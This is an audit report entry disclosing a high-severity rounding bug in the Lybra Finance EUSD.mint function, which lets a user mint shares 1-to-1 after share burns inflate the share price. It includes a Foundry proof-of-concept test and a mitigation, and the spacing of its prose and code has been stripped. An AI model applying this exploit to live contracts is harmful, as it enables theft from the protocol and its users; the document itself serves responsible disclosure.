[H-06]EUSD.mintfunction wrong assumption of cases when calculated sharesAmount = 0
Submitted byktg, also found byKaysoft,dacian,kutugu,Co0nan,jnrlouis, andn1punp
Lines of code
https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L299-#L306https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/token/EUSD.sol#L414-#L418
Impact
Mintfunction might calculate thesharesAmountincorrectly.User can profit by manipulating the protocol to enjoy 1-1 share-eUSD ratio even when share prices is super high.
Proof of Concept
Currently, the functionEUSD.mintcalls functionEUSD.getSharesByMintedEUSDto calculate the shares corresponding to the input eUSD amount:
functionmint(address_recipient,uint256_mintAmount)externalonlyMintVaultMintPausedreturns(uint256newTotalShares) {require(_recipient!=address(0),"MINT_TO_THE_ZERO_ADDRESS");uint256sharesAmount=getSharesByMintedEUSD(_mintAmount);if(sharesAmount==0) {//EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1sharesAmount=_mintAmount;}...}functiongetSharesByMintedEUSD(uint256_EUSDAmount)publicviewreturns(uint256) {uint256totalMintedEUSD=_totalSupply;if(totalMintedEUSD==0) {return0;}else{return_EUSDAmount.mul(_totalShares).div(totalMintedEUSD);}}
As you can see in the comment aftersharesAmountis checked,//EUSD totalSupply is 0: assume that shares correspond to EUSD 1-to-1. The code assumes that ifsharesAmount = 0, thentotalSupplymust be 0 and the minted share should equal to input eUSD. However, thatâ€™s not always the case.
VariablesharesAmountcould be 0 iftotalShares *_EUSDAmount<totalMintedEUSDbecause this is integer division. If that happens, the user will profit by calling mint with a small EUSD amount and enjoys 1-1 minting proportion (1 share for each eUSD). The reason this can happen is becauseEUSDsupportburnSharesfeature, which remove the share of a users but keep thetotalSupplyvalue.
For example:
At the start, Bob is minted 1e18 eUSD, they receive 1e18 shares.Bob callburnSharesby1e18-1. After this, contract contains 1e18 eUSD and 1 share, which mean 1 share now worth 1e18 eUSD.If Alice callsmintwith 1e18 eUSD, then they receive 1 share (since 1 share worth 1e18 eUSD).However, if they then callmintwith 1e17 eUSD, they will receive 1e17 shares although 1 share is now worth 1e18 eUSD. This happens because1e17 * (totalShares = 2) / (totalMintedEUSD = 2e18)= 0.
Below is POC for the above example. I use foundry to run tests; create a folder namedtestand save this to a file namedeUSD.t.sol, then run it using command:
forge test --match-path test/eUSD.t.sol -vvvv
pragmasolidity^0.8.17;import{Test,console2}from"forge-std/Test.sol";import{Iconfigurator}from"contracts/lybra/interfaces/Iconfigurator.sol";import{Configurator}from"contracts/lybra/configuration/LybraConfigurator.sol";import{GovernanceTimelock}from"contracts/lybra/governance/GovernanceTimeLock.sol";import{mockCurve}from"contracts/mocks/mockCurve.sol";import{EUSD}from"contracts/lybra/token/EUSD.sol";contractTestEUSDisTest{addressadmin=address(0x1111);addressuser1=address(0x1);addressuser2=address(0x2);addresspool=address(0x3);Configuratorconfigurator;GovernanceTimelockgovernanceTimeLock;mockCurvecurve;EUSDeUSD;functionsetUp()public{// deploy curvecurve=newmockCurve();// deploy governance time lockaddress[]memoryproposers=newaddress[](1);proposers[0] =admin;address[]memoryexecutors=newaddress[](1);executors[0] =admin;governanceTimeLock=newGovernanceTimelock(1,proposers,executors,admin);configurator=newConfigurator(address(governanceTimeLock),address(curve));eUSD=newEUSD(address(configurator));// set mintVault to this addressvm.prank(admin);configurator.setMintVault(address(this),true);}functiontestRoundingNotCheck()public{// Mint some tokens for user1eUSD.mint(user1,1e18);assertEq(eUSD.balanceOf(user1),1e18);assertEq(eUSD.totalSupply(),1e18);//eUSD.burnShares(user1,1e18-1);assertEq(eUSD.getTotalShares(),1);assertEq(eUSD.sharesOf(user1),1);assertEq(eUSD.totalSupply(),1e18);// After this, 1 shares worth 1e18 eUSDs// If mintAmount = 1e18 -> receive  1 shareseUSD.mint(user2,1e18);assertEq(eUSD.getTotalShares(),2);assertEq(eUSD.sharesOf(user2),1);assertEq(eUSD.totalSupply(),2e18);// However, if mintAmount = 1e17 -> receive 1e17 shareseUSD.mint(user2,1e17);assertEq(eUSD.sharesOf(user2),1+1e17);}}
Tools Used
Manual Review
Recommended Mitigation Steps
I recommend checking again inEUSD.mintfunction ifsharesAmountis 0 andtotalSupplyis not 0, then exit the function without minting anything.
LybraFinance confirmed